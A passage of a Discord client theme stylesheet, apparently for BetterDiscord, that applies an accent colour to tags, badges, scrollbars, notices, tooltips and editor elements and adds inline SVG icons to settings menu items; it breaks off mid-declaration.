.theme-dark .lookFilled-1h1y05.select-1Pkeg4:focus {
	border-color: rgb(var(--vaccentcolor));
}
.theme-dark .lookFilled-1h1y05.select-1Pkeg4:hover.selectOpen-hQuR6b,
.theme-dark .lookFilled-1h1y05.selectOpen-hQuR6b {
	border-color: rgb(var(--vaccentcolor)) rgb(var(--vaccentcolor)) rgba(0, 0, 0, 0.3);
}

/* ----		12.4.	TAGS							---- */

.botTagRegular-2HEhHi {										/* bottag				regular								*/
	background-color: rgb(var(--vaccentcolor));
}
.botTagInvert-18-95s {										/* bottag				inverted							*/
	color: rgb(var(--vaccentcolor));
}

.verified-1eC5dy {											/* verifiedbadge											*/
	color: rgb(var(--vaccentcolor));
}
.partnered-3nJayh {											/* partneredbadge											*/
	color: rgb(var(--vaccentcolor));
}
.partnered-3nJayh .flowerStar-1GeTsn {
	filter: brightness(75%);
}

/* ----		12.5.	ICONS							---- */

[style*="/assets/f78426a064bc9dd24847519259bc42af.png"],
[src*="/assets/f78426a064bc9dd24847519259bc42af.png"] {		/* avatars				clyde								*/
	object-position: -999999px -999999px;
	background: rgb(var(--vaccentcolor)) url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/clydeicon_details.svg) center/contain no-repeat !important;
}
[style*="/assets/6debd47ed13483642cf09e832ed0bc1b.png"],
[src*="/assets/6debd47ed13483642cf09e832ed0bc1b.png"] {		/* avatars				blue discord						*/
	object-position: -999999px -999999px;
	background: rgb(var(--vaccentcolor)) url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurplediscordicon_details.svg) center/contain no-repeat !important;
}

/* ----		12.6.	SCROLLBARS						---- */

.scrollerThemed-2oenus.themeLight-1_DWyY .scrollbar-2rkZSL .thumb-2JwNFC,
.theme-dark .scrollerThemed-2oenus.themeLight-1_DWyY .scrollbar-2rkZSL .thumb-2JwNFC,
.theme-light .scrollerWrap-2lJEkd .scrollbar-2rkZSL .thumb-2JwNFC,
.theme-light .scrollerThemed-2oenus.themedWithTrack-q8E3vB .scrollbar-2rkZSL .thumb-2JwNFC,
.theme-light .scrollbarDefault-3COgCQ::-webkit-scrollbar-thumb {
	background-color: rgb(var(--vaccentcolor));
}

::-webkit-scrollbar-corner,
#app-mount ::-webkit-scrollbar-corner {
	background-color: transparent;
}

/* ----		12.7.	NOTIFICATIONBAR					---- */

.colorPremiumTier1-3D7SPt {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.7));
}
.colorPremiumTier1-3D7SPt .button-2DhvE9:hover {
	color: rgb(var(--vaccentcolor));
}
.colorPremiumTier2-dCdap5 {
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.colorPremiumTier2-dCdap5 .button-2DhvE9:hover {
	color: rgb(var(--vaccentcolor));
}
.colorBrand-2zeG8h {
	background-color: rgb(var(--vaccentcolor));
}
.colorBrand-2zeG8h .button-2DhvE9:hover {
	color: rgb(var(--vaccentcolor));
}
.notice-3bPHh-[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}
.notice-3bPHh-[style*="background-color: rgb(114, 137, 218)"] .button-2DhvE9:hover {
	color: rgb(var(--vaccentcolor)) !important;
}
.notice-2X5hT5 {											/* preview notice											*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.5), rgba(var(--vaccentcolor), 0.5));
}
.button-2PWmas:hover {										/* preview notice		button								*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.7), rgba(var(--vaccentcolor), 0.7));
}
.notice-1tZwqv {											/* role notice												*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.5), rgba(var(--vaccentcolor), 0.5));
}
.button-3Ijpww:hover {										/* role notice			button								*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.7), rgba(var(--vaccentcolor), 0.7));
}
.notice-3uyY6c {											/* rules notice												*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.5), rgba(var(--vaccentcolor), 0.5));
}
.button-gP4R86:hover {										/* rules notice			button								*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.7), rgba(var(--vaccentcolor), 0.7));
}

/* ----		12.8.	TOOLTIPS						---- */

#app-mount .tooltipBrand-g03Nz8 {
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .tooltipBrand-g03Nz8 .tooltipPointer-3ZfirK {
	border-top-color: rgb(var(--vaccentcolor));
}

.content-3O0wBS {
	background-color: rgb(var(--vaccentcolor));
}
.content-3O0wBS	.button-3zdF3z {
	color: rgb(var(--vaccentcolor));
}
.pointer-3ClhC2 {
	border-top-color: rgb(var(--vaccentcolor));
}

/* ----		12.9.	TOASTS							---- */

.toast-brand {
	background-color: rgb(var(--vaccentcolor));
}


/* ~~~~		13.		BDSUPPORT						~~~~ */

#bd-pub-button {
	color: var(--text-normal);
	transition: background-color .15s ease-out, color .15s ease-out;
}
#bd-pub-button:hover {
	color: rgb(var(--fontwhite1, var(--dfontwhite1)));
	background-color: rgb(var(--vaccentcolor));
}
#bd-pub-button:active {
	color: rgb(var(--fontwhite1, var(--dfontwhite1)));
	background: var(--vaccentcolor-hover);
}
#pubslayer button:hover {
	background: var(--vaccentcolor-hover);
}
#pubslayer button:active {
	background: var(--vaccentcolor-active);
}
.bd-server-card.bd-server-card-pinned::after {
	background: var(--bd-blue);
}

.bd-modal-wrapper .footer button {
	background: var(--bd-blue);
}
.bd-modal-wrapper .footer button:hover {
	background: var(--vaccentcolor-hover);
}
.bd-modal-wrapper .footer button:active {
	background: var(--vaccentcolor-active);
}
.bd-modal-wrapper .error-link {
	color: var(--bd-blue);
}

.bd-pfbtn {
	background: var(--bd-blue);
}
.bd-pfbtn:hover {
	background: var(--vaccentcolor-hover);
}
.bd-pfbtn:active {
	background: var(--vaccentcolor-active);
}

.bd-button {
	background: var(--bd-blue);
}
.bd-button:hover {
	background: var(--vaccentcolor-hover);
}
.bd-button:active {
	background: var(--vaccentcolor-active);
}

.bd-addon-views .bd-view-button.selected {
	background: var(--bd-blue);
}

.bd-addon-list .bd-footer a {
	color: var(--bd-blue);
}

#bd-settingspane-container .ui-switch-item .ui-switch-wrapper .ui-switch.checked,
.bd-switch-checked {
	background-color: rgba(var(--vaccentcolor), 0.8);
}
#bd-settingspane-container .ui-switch-item .ui-switch-wrapper .ui-switch.checked:hover,
.bd-switch-checked:hover {
	background: var(--vaccentcolor-hover);
}
#bd-settingspane-container .ui-switch-item .ui-switch-wrapper .ui-switch.checked:active,
.bd-switch-checked:active {
	background: var(--vaccentcolor-active);
}
.bd-switch::before {
	box-shadow: none;
}

html .monaco-editor .find-widget .monaco-inputbox.synthetic-focus {
	outline-color: rgb(var(--vaccentcolor));
}
html .monaco-editor .monaco-editor-hover a {
	color: rgb(var(--vaccentcolor));
}
html .monaco-editor [class*="arrow-decoration"] {
	border-bottom-color: rgb(var(--vaccentcolor));
}
html .monaco-editor .focused .selected-text {
	background-color: rgb(var(--vaccentcolor));
}

html .monaco-tree[class*="monaco-tree-instance"].focused .monaco-tree-rows > .monaco-tree-row.focused:not(.highlighted) {
	background-color: rgb(var(--vaccentcolor));
	color: #ffffff;
}
html .monaco-tree[class*="monaco-tree-instance"].focused .monaco-tree-rows > .monaco-tree-row.focused:not(.highlighted) .results-group {
	color: #ffffff !important;
}

html .monaco-editor [style*="background-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="background: rgb(0, 122, 204)"],
html .monaco-editor [style*="background-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="background: rgb(14, 122, 192)"],
html .monaco-editor [style*="background-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="background: rgb(14, 99, 156)"],
html .monaco-editor [style*="background-color: rgb(9, 71, 113)"],
html .monaco-editor [style*="background: rgb(9, 71, 113)"] {
	background: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.9)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.9)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.9)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.9)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.9)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.9)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.9)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.9)"] {
	background: rgba(var(--vaccentcolor), 0.9) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.8)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.8)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.8)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.8)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.8)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.8)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.8)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.8)"] {
	background: rgba(var(--vaccentcolor), 0.8) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.7)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.7)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.7)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.7)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.7)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.7)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.7)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.7)"] {
	background: rgba(var(--vaccentcolor), 0.7) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.6)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.6)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.6)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.6)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.6)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.6)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.6)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.6)"] {
	background: rgba(var(--vaccentcolor), 0.6) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.5)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.5)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.5)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.5)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.5)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.5)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.5)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.5)"] {
	background: rgba(var(--vaccentcolor), 0.5) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.4)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.4)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.4)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.4)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.4)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.4)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.4)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.4)"] {
	background: rgba(var(--vaccentcolor), 0.4) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.3)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.3)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.3)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.3)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.3)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.3)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.3)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.3)"] {
	background: rgba(var(--vaccentcolor), 0.3) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.2)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.2)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.2)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.2)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.2)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.2)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.2)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.2)"] {
	background: rgba(var(--vaccentcolor), 0.2) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.1)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.1)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.1)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.1)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.1)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.1)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.1)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.1)"] {
	background: rgba(var(--vaccentcolor), 0.1) !important;
}
html .monaco-editor [style*="border-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-color: rgb(9, 71, 113)"] {
	border-color: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="border-top-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-top-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-top-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-top-color: rgb(9, 71, 113)"] {
	border-top-color: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="border-right-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-right-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-right-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-right-color: rgb(9, 71, 113)"] {
	border-right-color: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="border-bottom-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-bottom-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-bottom-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-bottom-color: rgb(9, 71, 113)"] {
	border-bottom-color: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="border-left-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-left-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-left-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-left-color: rgb(9, 71, 113)"] {
	border-left-color: rgb(var(--vaccentcolor)) !important;
}

.embedFull-2tM8--[style*="border-color: rgb(62, 130, 229)"],
.embedFull-2tM8--[style*="border-color: rgb(62, 130, 226)"] {
	border-color: rgb(var(--vaccentcolor)) !important;
}


/* ~~~~		14.		POWERCORDSUPPORT				~~~~ */

.powercord-toast .progressBar-3u8FBM {
	background-color: rgb(var(--vaccentcolor));
}


/* ~~~~		15.		PLUGINSUPPORT					~~~~ */

/* ----		15.1.	IMAGEZOOM						---- */

.zoomLens-uOK8xV {
	border-color: rgb(var(--vaccentcolor)) !important;
}

/* ----		15.2.	HIDEUTILS						---- */

#HideUtils-Settings button {
	background-color: rgb(var(--vaccentcolor)) !important;
}

/* ----		15.3.	READALLNOTIFICATIONSBUTTON		---- */

.wrapper-1BJsBx:active .childWrapper-anI2G9.button-Jt-tIg{
	background: var(--vaccentcolor-hover);
	color: rgb(var(--fontwhite1, var(--dfontwhite1)));
}

/* ----		15.4.	SERVERSEARCH					---- */

#server-search .wrapper-25eVIn {
	background-color: rgb(47, 49, 54) !important;
	transition: background-color .16s ease-out;
}
#server-search .wrapper-25eVIn:hover {
	background-color: rgb(var(--vaccentcolor)) !important;
}

/* ----		15.5.	CHANNELTABS						---- */

.channelTabs-unreadBadge:not(.channelTabs-noUnread) {
	background-color: rgb(var(--vaccentcolor)) !important;
}


/* ~~~~		16.		THEMESUPPORT					~~~~ */

/* ----		16.1.	THEMEDEVBADGE					---- */

#app-mount .dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s {
	background: rgb(var(--vaccentcolor)) !important;
}
#app-mount .topSectionPlaying-1J5E4n .dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s,
#app-mount .headerPlaying-j0WQBV .dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s {
	background: rgb(var(--vaccentcolor)) !important;
}

/* --------------------------------------------------------------------------------------------------- */

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| EXTENSIONS | Settings-Icons ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/* Settings-Icons | Adds icons to the settings menu (made by Snapperito, botato, MulverineX, AAGaming)*/
.side-8zPYf6>.item-PXvHYJ[data-item-id=MyAccount]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white' width='18px' height='18px'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=PrivacynSafety]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white' width='18px' height='18px'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=AuthorizedApps]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white' width='18px' height='18px'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=Connections]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='24' viewBox='0 0 24 24' fill='white' width='24'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=Billing]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white' width='18px' height='18px'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=DiscordNitro]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Crect width='24' height='24'/%3E%3Cg fill='%2380A6FF' transform='translate(0 2)'%3E%3Cpath fill-rule='nonzero' d='M14,3 C10.1340068,3 7,6.13400675 7,10 C7,13.8659932 10.1340068,17 14,17 C17.8659932,17 21,13.8659932 21,10 C21,6.13400675 17.8659932,3 14,3 Z M3,9 L4,9 C4.55228475,9 5,8.55228475 5,8 C5,7.44771525 4.55228475,7 4,7 L1,7 C0.44771525,7 0,6.55228475 0,6 C0,5.44771525 0.44771525,5 1,5 L6,5 C6.55228475,5 7,4.55228475 7,4 C7,3.44771525 6.55228475,3 6,3 L3.5,3 C2.67157288,3 2,2.32842712 2,1.5 C2,0.671572875 2.67157288,0 3.5,0 L14,0 C19.5228475,0 24,4.4771525 24,10 C24,15.5228475 19.5228475,20 14,20 C8.8146519,20 4.55109967,16.0533227 4.04937524,11 L3,11 C2.44771525,11 2,10.5522847 2,10 C2,9.44771525 2.44771525,9 3,9 Z'/%3E%3Cpath d='M14,15 C11.2385763,15 9,12.7614237 9,10 C9,7.23857625 11.2385763,5 14,5 C16.7614237,5 19,7.23857625 19,10 C19,12.7614237 16.7614237,15 14,15 Z M15.826989,7.45045379 C15.6420424,7.16928349 15.3280698,7 14.9915257,7 L13.0655484,7 C12.7290042,7 12.4150316,7.16928349 12.2300851,7.45045379 L10.9145367,9.45045379 C10.6951544,9.7839759 10.6951544,10.2160241 10.9145367,10.5495462 L12.2300851,12.5495462 C12.4150316,12.8307165 12.7290042,13 13.0655484,13 L14.9915257,13 C15.3280698,13 15.6420424,12.8307165 15.826989,12.5495462 L17.1425374,10.5495462 C17.3619196,10.2160241 17.3619196,9.7839759 17.1425374,9.45045379 L15.826989,7.45045379 Z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");--settings-icon-color: var(--settings-subscriptions)}.side-8zPYf6>.item-PXvHYJ[data-item-id=LibraryInventory]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg fill='%23FFFFFF' width='24' height='24' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M16.886 7.999H20C21.104 7.999 22 8.896 22 9.999V11.999H2V9.999C2 8.896 2.897 7.999 4 7.999H7.114C6.663 7.764 6.236 7.477 5.879 7.121C4.709 5.951 4.709 4.048 5.879 2.879C7.012 1.746 8.986 1.746 10.121 2.877C11.758 4.514 11.979 7.595 11.998 7.941C11.9991 7.9525 11.9966 7.96279 11.9941 7.97304C11.992 7.98151 11.99 7.98995 11.99 7.999H12.01C12.01 7.98986 12.0079 7.98134 12.0058 7.97287C12.0034 7.96282 12.0009 7.95286 12.002 7.942C12.022 7.596 12.242 4.515 13.879 2.878C15.014 1.745 16.986 1.746 18.121 2.877C19.29 4.049 19.29 5.952 18.121 7.121C17.764 7.477 17.337 7.764 16.886 7.999ZM7.293 5.707C6.903 5.316 6.903 4.682 7.293 4.292C7.481 4.103 7.732 4 8 4C8.268 4 8.519 4.103 8.707 4.292C9.297 4.882 9.641 5.94 9.825 6.822C8.945 6.639 7.879 6.293 7.293 5.707ZM14.174 6.824C14.359 5.941 14.702 4.883 15.293 4.293C15.481 4.103 15.732 4 16 4C16.268 4 16.519 4.103 16.706 4.291C17.096 4.682 17.097 5.316 16.707 5.707C16.116 6.298 15.057 6.642 14.174 6.824ZM3 13.999V19.999C3 21.102 3.897 21.999 5 21.999H11V13.999H3ZM13 13.999V21.999H19C20.104 21.999 21 21.102 21 19.999V13.999H13Z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=NitroServerBoost]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg fill='%23FFFFFF' height='24' width='24' viewBox='0 0 8 12' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M4 0L0 4V8L4 12L8 8V4L4 0ZM7 7.59L4 10.59L1 7.59V4.41L4 1.41L7 4.41V7.59Z'/%3E%3Cpath d='M2 4.83V7.17L4 9.17L6 7.17V4.83L4 2.83L2 4.83Z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=HypesquadOnline]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='34' height='32'%3E%3Cdefs%3E%3Cpath id='a' d='M0 0h33.985v22.936H0z'/%3E%3C/defs%3E%3Cg fill='none' fill-rule='evenodd' transform='translate(0 5)'%3E%3Cmask id='b' fill='%23fff'%3E%3Cuse xlink:href='%23a'/%3E%3C/mask%3E%3Cpath fill='%23F8A532' d='M33.374.065L19.936 8.62c-.232.148-.42.353-.544.594L17.344 13.2a.398.398 0 01-.703 0l-2.05-3.985a1.54 1.54 0 00-.543-.594L.611.065C.274-.15-.138.208.045.556L5.616 11.16c.133.254-.056.554-.35.554H1.932c-.382 0-.54.475-.229.69l15.06 10.462c.137.095.321.095.458 0l15.06-10.461c.311-.216.154-.69-.228-.69h-3.334c-.294 0-.484-.301-.35-.555L33.938.556c.184-.348-.228-.706-.565-.491' mask='url(%23b)'/%3E%3C/g%3E%3C/svg%3E");--settings-icon-color: var(--settings-hypesquad)}.side-8zPYf6>.item-PXvHYJ[data-item-id=VoicenVideo]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white' width='18px' height='18px'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M12 14c1.66 0 2.99-1.34 2.99-3L15 5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=Overlay]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white' width='18px' height='18px'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=Notifications]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white' width='18px' height='18px'%3E%3Cpath d='M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=Keybinds]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white' width='18px' height='18px'%3E%3Cpath d='M20 5H4c-1.1 0-1.99.9-1.99 2L2 17c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-9 3h2v2h-2V8zm0 3h2v2h-2v-2zM8 8h2v2H8V8zm0 3h2v2H8v-2zm-1 2H5v-2h2v2zm0-3H5V8h2v2zm9 7H8v-2h8v2zm0-4h-2v-2h2v2zm0-3h-2V8h2v2zm3 3h-2v-2h2v2zm0-3h-2V8h2v2z'/%3E%3Cpath d='M0 0h24v24H0zm0 0h24v24H0z' fill='none'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=GameActivity]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='24' viewBox='0 0 24 24' fill='white' width='24'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M15 7.5V2H9v5.5l3 3 3-3zM7.5 9H2v6h5.5l3-3-3-3zM9 16.5V22h6v-5.5l-3-3-3 3zM16.5 9l-3 3 3 3H22V9h-5.5z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=TextnImages]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white' width='18px' height='18px'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM6 9h12v2H6V9zm8 